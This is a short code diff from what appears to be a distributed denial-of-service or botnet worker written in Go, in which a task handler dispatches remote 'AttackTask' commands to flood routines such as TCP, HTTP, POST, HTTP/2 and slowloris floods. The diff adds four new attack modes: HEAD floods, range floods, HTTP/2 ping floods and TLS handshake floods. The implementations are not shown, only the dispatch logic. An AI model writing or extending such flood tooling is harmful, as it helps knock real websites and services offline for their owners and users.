@@ -1264,6 +1264,10 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 		session = attack.StartTCPFloodEx(cfg)
 	case "http_flood":
 		session = attack.StartHTTPFloodEx(cfg)
+	case "head_flood":
+		session = attack.StartHEADFloodEx(cfg)
+	case "range_flood":
+		session = attack.StartRangeFloodEx(cfg)
 	case "post_flood":
 		session = attack.StartPOSTFloodEx(cfg)
 	case "http2_flood":
@@ -1274,6 +1278,10 @@ func (w *Worker) startTask(task *pb.AttackTask) {
 		session = attack.StartHTTP2ContinuationEx(cfg)
 	case "http2_bomb":
 		session = attack.StartHTTP2BombEx(cfg)
+	case "h2_ping":
+		session = attack.StartH2PingEx(cfg)
+	case "tls_handshake":
+		session = attack.StartTLSHandshakeEx(cfg)
 	case "slowloris", "slow_post":
 		session = attack.StartSlowlorisEx(cfg)
 	case "https_bypass":
